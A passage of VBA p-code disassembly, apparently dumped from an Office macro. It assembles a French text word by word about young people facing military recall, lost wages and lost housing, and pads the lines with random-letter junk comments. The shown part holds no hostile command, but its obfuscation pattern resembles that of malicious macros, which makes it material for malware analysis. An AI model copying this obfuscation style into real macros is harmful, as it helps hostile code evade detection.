' 	LitStr 0x0009 "National."
' 	Add 
' 	St i7 
' 	BoS 0x0000 
' 	LitStr 0x0002 "En"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "réalité,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "situation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "actuelle"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g5 
' 	BoS 0x0000 
' 	Ld g5 
' 	LitStr 0x0007 "encore:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Après"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "avoir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "accordé"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "report"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "incorporation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g5 
' 	QuoteRem 0x00DD 0x000A " dqpnpsopd"
' Line #170:
' 	LineCont 0x0004 1A 00 00 00
' 	Ld g5 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "2"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "aux"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g5 
' 	QuoteRem 0x000A 0x000E " zhabrgxcqedwc"
' Line #171:
' 	LineCont 0x0008 0B 00 00 00 2D 00 00 00
' 	LitStr 0x0006 "jeunes"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "ayant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "obtenu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "Travail,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Armée"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e1 
' 	QuoteRem 0x002E 0x000F " eprmlebhhyzcjo"
' Line #172:
' 	Ld e1 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "intention"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "rappeler"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "beau"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "milieu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e1 
' 	QuoteRem 0x00B4 0x000C " btihhyqlgjv"
' Line #173:
' 	LineCont 0x0010 21 00 00 00 29 00 00 00 59 00 00 00 74 00 00 00
' 	Ld e1 
' 	LitStr 0x0004 "leur"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "carrière"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "professionnelle."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "implications"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e1 
' 	BoS 0x0000 
' 	Ld e1 
' 	LitStr 0x0003 "sûr"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "catastrophiques:"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e1 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Vivre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "salaire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "pendant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ne"
' 	Add 
' 	St m4 
' 	QuoteRem 0x003F 0x000C " brtlvqdzneb"
' Line #174:
' 	LineCont 0x003C 20 00 00 00 3E 00 00 00 59 00 00 00 66 00 00 00 88 00 00 00 FC 00 00 00 0D 01 00 00 19 01 00 00 1B 01 00 00 46 01 00 00 58 01 00 00 82 01 00 00 93 01 00 00 99 01 00 00 BC 01 00 00
' 	Ld m4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "permet"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "pas"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "assurer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "engagements,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "dettes"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St m4 
' 	BoS 0x0000 
' 	LitStr 0x0006 "impôts"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "déjà"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "difficiles"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "assumer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "dans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	St b3 
' 	BoS 0x0000 
' 	Ld b3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "début"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "active"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "normal."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b3 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Ne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "pas"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "pratiquer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "activité"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "professionnelle"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d4 
' 	BoS 0x0000 
' 	Ld d4 
' 	LitStr 0x0007 "pendant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "implique"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "également"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "perte"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "expérience"
' 	Add 
' 	St d4 
' 	BoS 0x0000 
' 	Ld d4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "utile,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "nécessité"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "période"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d4 
' 	BoS 0x0000 
' 	LitStr 0x0002 "de"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "réadaptation,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "modification"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "projet"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "professionnel"
' 	Add 
' 	St f7 
' 	BoS 0x0000 
' 	Ld f7 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sûr"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "inquantifiable"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "colère"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "des"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "employeurs,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St f7 
' 	QuoteRem 0x002C 0x0010 " bldqyndjdyycsiy"
' Line #175:
' 	Ld f7 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "se"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "traduira,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "intentionnellement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ou"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "non,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "par"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St f7 
' 	QuoteRem 0x00AB 0x000E " gmtcrkptirebn"
' Line #176:
' 	LineCont 0x0004 21 00 00 00
' 	Ld f7 
' 	LitStr 0x000E "ralentissement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "dans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "évolution"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "carrière."
' 	Add 
' 	St f7 
' 	QuoteRem 0x0018 0x0010 " lbeewwxxbhrrauh"
' Line #177:
' 	LineCont 0x0014 06 00 00 00 31 00 00 00 79 00 00 00 93 00 00 00 9A 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "fait"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "soit"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tout"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "bonnement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "impossible"
' 	Add 
' 	St i3 
' 	BoS 0x0000 
' 	Ld i3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "assurer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "loyer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sans"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "salaire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sur"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i3 
' 	BoS 0x0000 
' 	Ld i3 
' 	LitStr 0x0005 "cette"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "période,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i3 
' 	QuoteRem 0x000A 0x000E " lypfvwtzyprhe"
' Line #178:
' 	LineCont 0x0004 11 00 00 00
' 	LitStr 0x0001 "l"
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "abandon"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "logement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "irrémédiable."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "prendra"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "alors"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g2 
' 	QuoteRem 0x008B 0x0008 " rvrtfqa"
' Line #179:
' 	LineCont 0x000C 19 00 00 00 1F 00 00 00 47 00 00 00
' 	Ld g2 
' 	LitStr 0x0002 "en"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "charge"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "frais"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "déménagement,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "garde-meuble"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g2 
' 	BoS 0x0000 
' 	Ld g2 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "recherche"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "nouvel"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "appartement?"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g2 
' 	QuoteRem 0x0082 0x000D " qbfcbftqeadn"
' Line #180:
' 	LineCont 0x0014 0D 00 00 00 2F 00 00 00 5F 00 00 00 72 00 00 00 79 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "dire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "situation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "morale"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e5 
' 	BoS 0x0000 
' 	Ld e5 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "bas"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "durant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ces"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "longs"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "?"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e5 
' 	QuoteRem 0x0021 0x000B " rkzfyzgpke"
' Line #181:
' 	LineCont 0x0008 01 00 00 00 22 00 00 00
' 	Ld e5 
' 	LitStr 0x0002 "Le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "rêve"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "on"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "était"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "entrain"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
